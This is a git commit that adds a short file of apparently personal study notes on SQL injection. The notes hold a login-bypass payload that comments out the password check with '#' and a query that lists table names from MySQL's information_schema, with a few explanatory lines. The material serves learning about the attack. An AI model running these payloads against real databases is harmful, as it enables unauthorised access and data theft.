2784b4865b305acaea84cf035e1c7d81bd4e818f
rksingh222 <62049275+rksingh222@users.noreply.github.com>
2023-05-12 18:33:29 +1000

    Create sqlinjection22...130.js

---
+++ sqlinjection22...130.js
@@ -0,0 +1,6 @@
+select * from accounts where username = 'zaid' order by 1#' and password = '$password'
+
+information_schema is a default database created in mysql
+inside the database information_schema get the tables
+table_name is the column name
+select 1,table_name,null,null,5 from information_schema.tables
